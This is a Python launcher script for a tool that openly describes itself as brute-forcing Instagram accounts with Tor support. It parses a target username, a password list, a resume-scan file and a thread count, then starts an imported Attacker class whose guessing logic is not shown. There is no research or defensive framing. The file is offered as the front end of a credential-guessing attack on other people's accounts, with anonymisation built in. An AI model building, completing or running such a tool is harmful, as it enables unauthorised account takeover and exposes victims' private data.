from sys import argv
from sys import exit as sysexit
from os.path import isfile, exists
from time import sleep
from attacker import Attacker
import argparse

strings = {
    'DESCRIPTION' : 'A tool for brute-forcing instagram accounts, with support for Tor.'
}

parser = argparse.ArgumentParser(description = strings['DESCRIPTION'])
parser.add_argument('username', action = 'store', nargs = '?', default = None)
parser.add_argument('passlist', action = 'store', nargs = '?', default = None)
parser.add_argument('-c', '--continue-scan', action = 'store', default = None, dest = 'saved_scan_file')
parser.add_argument('-t' ,'--threads', action = 'store', default = None, type = int)

args = vars(parser.parse_args())

# validate `args`: numbers
if args['saved_scan_file'] == None:
    if args['username'] == None or args['passlist'] == None:
        parser.error('Not enough arguments: Missing username or passlist')

# validate `args`: values
for key in args:
    if args[key] == None:
        continue
    if key == 'saved_scan_file':
        if not exists(args[key]):
            parser.error('Could not open %s: No such file or directory.' % args[key])
        elif not isfile(args[key]):
            parser.error('Could not open %s: Not a file.' % args[key])
    elif key == 'passlist':
        if not exists(args[key]):
            parser.error('Could not open %s: No such file or directory.' % args[key])
            sysexit(0)
        elif not isfile(args[key]):
            parser.error('Could not open %s: Not a file.' % args[key])
            sysexit(0)
    



attacker = Attacker(args)
attacker.start()

try:
    attacker.block()
    print()
except KeyboardInterrupt:
    print()
    print(' ==> Exiting... might take a while...')
    attacker.stop()
    attacker.block()
    print()

